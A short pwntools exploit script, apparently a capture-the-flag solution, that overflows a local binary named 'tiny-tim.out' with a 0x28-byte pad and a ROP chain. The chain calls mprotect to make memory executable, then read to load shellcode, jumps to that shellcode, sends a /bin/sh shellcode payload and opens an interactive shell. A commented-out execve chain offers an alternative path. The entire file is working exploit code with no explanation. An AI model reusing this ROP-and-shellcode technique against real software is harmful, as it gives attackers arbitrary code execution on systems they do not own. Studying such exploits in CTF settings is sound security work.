from pwn import *
import time

p = process('tiny-tim.out')
e = ELF('tiny-tim.out')
context.binary = ELF('tiny-tim.out')

writable = 0x400000
syscall = 0x401041
pop_rax = e.symbols['secret0']
pop_rsi = e.symbols['secret1']
pop_rdi = e.symbols['secret2']
pop_rdx = e.symbols['secret3']


payload = b'A' * 0x28

# mprotect(writable, 0x2000, 7)
payload += pack(pop_rax, 64)
payload += pack(0xa, 64)
payload += pack(pop_rdi, 64)
payload += pack(writable, 64)
payload += pack(pop_rsi, 64)
payload += pack(0x2000, 64)
payload += pack(pop_rdx, 64)
payload += pack(7, 64)
payload += pack(syscall, 64)
payload += pack(0, 64)

# read(0, writable+0x1400, 0x400)
payload += pack(pop_rax, 64)
payload += pack(0, 64)
payload += pack(pop_rdi, 64)
payload += pack(0, 64)
payload += pack(pop_rsi, 64)
payload += pack(writable + 0x1400, 64)
payload += pack(pop_rdx, 64)
payload += pack(0x400, 64)
payload += pack(syscall, 64)
payload += pack(0, 64)

payload += pack(writable + 0x1400, 64)

# execve(writable+0x1400, NULL, NULL)
# payload += pack(pop_rax, 64)
# payload += pack(59, 64)
# payload += pack(pop_rdi, 64)
# payload += pack(writable + 0x1400, 64)
# payload += pack(pop_rsi, 64)
# payload += pack(0, 64)
# payload += pack(pop_rdx, 64)
# payload += pack(0, 64)
# payload += pack(syscall, 64)

p.sendline(payload)
time.sleep(1)
p.sendline(asm(shellcraft.sh()))
# p.sendline('/bin/sh\x00')

p.interactive()
